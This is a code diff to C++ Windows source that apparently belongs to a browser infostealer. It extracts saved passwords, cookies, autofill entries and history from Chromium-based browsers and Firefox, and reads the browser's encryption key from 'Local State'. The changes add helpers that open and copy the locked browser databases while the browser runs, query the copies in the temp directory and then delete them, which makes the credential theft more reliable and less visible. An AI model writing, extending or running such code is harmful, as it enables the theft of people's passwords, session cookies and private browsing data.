@@ -35,6 +35,50 @@ std::string to_narrow_string(const wchar_t* w_str) {
     return res;
 }
 
+std::vector<uint8_t> read_file_locked(const fs::path& p) {
+    HANDLE h_file = CreateFileW(p.wstring().c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h_file == INVALID_HANDLE_VALUE) return {};
+
+    DWORD size = GetFileSize(h_file, NULL);
+    if (size == INVALID_FILE_SIZE) {
+        CloseHandle(h_file);
+        return {};
+    }
+
+    std::vector<uint8_t> buffer(size);
+    DWORD bytes_read = 0;
+    if (!ReadFile(h_file, buffer.data(), size, &bytes_read, NULL)) {
+        buffer.clear();
+    }
+    CloseHandle(h_file);
+    return buffer;
+}
+
+bool copy_file_locked(const fs::path& src, const fs::path& dest) {
+    HANDLE h_src = CreateFileW(src.wstring().c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h_src == INVALID_HANDLE_VALUE) return false;
+
+    HANDLE h_dest = CreateFileW(dest.wstring().c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h_dest == INVALID_HANDLE_VALUE) {
+        CloseHandle(h_src);
+        return false;
+    }
+
+    BYTE buffer[4096];
+    DWORD bytes_read, bytes_written;
+    bool success = true;
+    while (ReadFile(h_src, buffer, sizeof(buffer), &bytes_read, NULL) && bytes_read > 0) {
+        if (!WriteFile(h_dest, buffer, bytes_read, &bytes_written, NULL) || bytes_written != bytes_read) {
+            success = false;
+            break;
+        }
+    }
+
+    CloseHandle(h_src);
+    CloseHandle(h_dest);
+    return success;
+}
+
 std::string path_to_uri(const fs::path& p) {
     std::string path_str = to_narrow_string(p.wstring().c_str());
     std::string encoded = "";
@@ -49,7 +93,7 @@ std::string path_to_uri(const fs::path& p) {
             encoded += buf;
         }
     }
-    return "file:" + encoded + "?mode=ro&nolock=1&immutable=1";
+    return "file:" + encoded + "?mode=ro&nolock=1";
 }
 
 struct BrowserConfig {
@@ -495,10 +539,10 @@ std::wstring get_user_data_dir(const std::vector<std::wstring>& subdir, bool use
 
 bool get_v10_key(const std::wstring& user_data_dir, std::vector<uint8_t>& key, bool& is_dpapi) {
     fs::path local_state_path = fs::path(user_data_dir) / L"Local State";
-    std::ifstream ifs(local_state_path);
-    if (!ifs.is_open()) return false;
+    std::vector<uint8_t> file_content = read_file_locked(local_state_path);
+    if (file_content.empty()) return false;
 
-    std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
+    std::string content(file_content.begin(), file_content.end());
     size_t pos = content.find("\"encrypted_key\":\"");
     if (pos == std::string::npos) return false;
     pos += 17;
@@ -810,7 +854,10 @@ void extract_passwords(const fs::path& profile_path, const fs::path& output_dir,
     }
     if (!fs::exists(db_path)) return;
 
-    std::string uri = path_to_uri(db_path);
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_passwords.db");
+    if (!copy_file_locked(db_path, temp_db)) return;
+
+    std::string uri = path_to_uri(temp_db);
     sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -833,6 +880,7 @@ void extract_passwords(const fs::path& profile_path, const fs::path& output_dir,
         }
         sqlite3_close(db);
     }
+    fs::remove(temp_db);
 }
 
 void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
@@ -840,7 +888,10 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
     if (!fs::exists(db_path)) db_path = profile_path / "Cookies";
     if (!fs::exists(db_path)) return;
 
-    std::string uri = path_to_uri(db_path);
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_cookies.db");
+    if (!copy_file_locked(db_path, temp_db)) return;
+
+    std::string uri = path_to_uri(temp_db);
     sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -866,6 +917,7 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
         }
         sqlite3_close(db);
     }
+    fs::remove(temp_db);
 }
 
 void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
@@ -877,7 +929,10 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
         fs::path db_path = profile_path / db_name;
         if (!fs::exists(db_path)) continue;
 
-        std::string uri = path_to_uri(db_path);
+        fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + db_name + ".db");
+        if (!copy_file_locked(db_path, temp_db)) continue;
+
+        std::string uri = path_to_uri(temp_db);
         sqlite3* db;
         if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
             sqlite3_stmt* stmt;
@@ -918,6 +973,7 @@ void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, 
             }
             sqlite3_close(db);
         }
+        fs::remove(temp_db);
     }
 }
 
@@ -925,7 +981,10 @@ void extract_history(const fs::path& profile_path, const fs::path& output_dir, c
     fs::path db_path = profile_path / "History";
     if (!fs::exists(db_path)) return;
 
-    std::string uri = path_to_uri(db_path);
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_history.db");
+    if (!copy_file_locked(db_path, temp_db)) return;
+
+    std::string uri = path_to_uri(temp_db);
     sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -942,6 +1001,7 @@ void extract_history(const fs::path& profile_path, const fs::path& output_dir, c
         }
         sqlite3_close(db);
     }
+    fs::remove(temp_db);
 }
 
 void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const BrowserConfig& config, const std::wstring& user_data_dir) {
@@ -984,7 +1044,10 @@ void extract_firefox_cookies(const fs::path& profile_path, const fs::path& outpu
     fs::path db_path = profile_path / "cookies.sqlite";
     if (!fs::exists(db_path)) return;
 
-    std::string uri = path_to_uri(db_path);
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_ff_cookies.db");
+    if (!copy_file_locked(db_path, temp_db)) return;
+
+    std::string uri = path_to_uri(temp_db);
     sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -1002,13 +1065,17 @@ void extract_firefox_cookies(const fs::path& profile_path, const fs::path& outpu
         }
         sqlite3_close(db);
     }
+    fs::remove(temp_db);
 }
 
 void extract_firefox_history(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
     fs::path db_path = profile_path / "places.sqlite";
     if (!fs::exists(db_path)) return;
 
-    std::string uri = path_to_uri(db_path);
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_ff_history.db");
+    if (!copy_file_locked(db_path, temp_db)) return;
+
+    std::string uri = path_to_uri(temp_db);
     sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -1025,13 +1092,17 @@ void extract_firefox_history(const fs::path& profile_path, const fs::path& outpu
         }
         sqlite3_close(db);
     }
+    fs::remove(temp_db);
 }
 
 void extract_firefox_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
     fs::path db_path = profile_path / "formhistory.sqlite";
     if (!fs::exists(db_path)) return;
 
-    std::string uri = path_to_uri(db_path);
+    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_ff_autofill.db");
+    if (!copy_file_locked(db_path, temp_db)) return;
+
+    std::string uri = path_to_uri(temp_db);
     sqlite3* db;
     if (sqlite3_open_v2(uri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, NULL) == SQLITE_OK) {
         sqlite3_stmt* stmt;
@@ -1047,6 +1118,7 @@ void extract_firefox_autofill(const fs::path& profile_path, const fs::path& outp
         }
         sqlite3_close(db);
     }
+    fs::remove(temp_db);
 }
 
 void extract_firefox_passwords(const fs::path& profile_path, const fs::path& output_dir, const fs::path& nss_dir);
